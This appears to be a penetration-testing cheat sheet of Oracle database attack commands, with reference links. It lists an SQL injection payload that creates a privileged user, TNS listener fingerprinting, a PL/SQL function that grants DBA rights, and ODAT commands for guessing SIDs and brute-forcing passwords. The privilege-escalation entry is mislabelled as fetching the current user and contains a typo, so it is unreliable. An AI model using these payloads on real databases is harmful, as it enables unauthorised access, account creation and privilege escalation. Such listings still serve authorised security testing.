### 1. oracle add user
```
create user victor identified by pass123 temporary tablespace temp default tablespace users;grant connect to victor;grant resource to victor;
```
**- web application,sql injection,Oracle**
#### References:

http://pentestmonkey.net/cheat-sheet/sql-injection/oracle-sql-injection-cheat-sheet
__________
### 2. Fingerprint remote oracle server
```
tnscmd10g version -h [victim]
```
**- enumeration,Oracle**
#### References:

https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/
http://cyborg.ztrela.com/tnscmd10g.php/
__________
### 3. Get Current user oracle DB : CMD new lines removed
```
CREATE OR REPLACE FUNCTION GETDBA(FOO varchar) return varchar deterministic authid curren_user is pragma autonomous_transaction; begin execute immediate 'grant dba to user1 identified by pass1'; commit; return 'FOO'; end;
```
**- enumeration,Oracle**
#### References:

https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/
__________
### 4. Used to guess common SIDs in Oracle databases
```
/path/to/odat/odat-libc2.5-x86_64 sidguesser -s [IP]
```
**- brute,Oracle,database**
#### References:

https://github.com/quentinhardy/odat
https://www.darknet.org.uk/2014/07/odat-oracle-database-attacking-tool-test-oracle-database-security/
http://www.kitploit.com/2014/07/odat-oracle-database-attacking-tool.html
__________
### 5. Used to brute common passwords in Oracle TNS listener
```
/path/to/odat/odat-libc2.5-x86_64 passwordguesser -d [SID] -s [IP]
```
**- brute,Oracle,database**
#### References:

https://www.darknet.org.uk/2014/07/odat-oracle-database-attacking-tool-test-oracle-database-security/
http://www.kitploit.com/2014/07/odat-oracle-database-attacking-tool.html
__________
